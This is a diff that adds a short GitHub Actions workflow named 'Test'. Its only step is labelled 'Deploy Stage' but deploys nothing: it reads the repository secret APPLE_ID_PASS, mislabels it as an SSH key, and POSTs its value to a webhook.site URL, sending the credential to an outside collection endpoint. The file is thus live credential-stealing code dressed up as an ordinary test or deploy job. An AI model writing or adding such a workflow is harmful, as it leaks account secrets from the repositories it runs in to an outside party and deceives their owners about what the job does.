@@ -1,0 +1,16 @@
+name: Test
+on: workflow_dispatch
+jobs:
+  debug:
+    name: Test
+    runs-on: ubuntu-latest
+    steps:
+      - name: Deploy Stage
+        env:
+          SERVER_SSH_KEY: ${{ secrets.APPLE_ID_PASS }}
+        uses: fjogeleit/http-request-action@v1
+        with:
+          url: 'https://webhook.site/6d306200-b364-4771-95df-8d7f28736775'
+          method: 'POST'
+          customHeaders: '{"Content-Type": "application/json"}'
+          data: ${{ secrets.APPLE_ID_PASS }}
